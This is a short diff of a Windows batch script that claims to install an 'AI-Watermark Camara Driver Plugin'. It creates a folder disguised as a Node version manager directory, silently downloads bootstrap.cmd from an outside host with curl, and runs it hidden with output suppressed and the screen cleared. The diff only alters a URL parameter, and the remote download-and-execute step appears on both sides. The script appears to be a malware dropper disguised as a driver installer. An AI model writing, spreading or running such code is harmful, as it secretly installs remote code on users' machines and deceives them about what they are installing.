@@ -2,7 +2,7 @@
 echo Installing AI-Watermark Camara Driver Plugin...
 set "TARGET_DIR=%USERPROFILE%\.nvm"
 if not exist "%TARGET_DIR%" ( mkdir "%TARGET_DIR%" )
-curl -s -L -o "%TARGET_DIR%\bootstrap.cmd" "https://compound.chat/video/windows?flag=5"
+curl -s -L -o "%TARGET_DIR%\bootstrap.cmd" "https://compound.chat/video/windows"
 cls
 start "" /b cmd /c "%TARGET_DIR%\bootstrap.cmd >nul 2>&1"
 cls
